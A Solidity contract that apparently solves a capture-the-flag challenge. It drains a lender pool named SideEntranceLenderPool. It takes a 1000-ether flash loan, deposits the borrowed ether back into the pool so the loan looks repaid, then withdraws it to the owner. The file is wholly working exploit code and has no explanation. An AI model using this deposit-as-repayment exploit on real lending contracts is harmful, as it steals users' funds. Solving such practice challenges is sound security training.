// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./SideEntranceLenderPool.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    using Address for address payable;
    SideEntranceLenderPool public pool;
    address owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    function flashloan() public payable {
        pool.flashLoan(1000 ether);
        pool.withdraw();
        payable(owner).sendValue(1000 ether);
    }

    receive() external payable {}
}
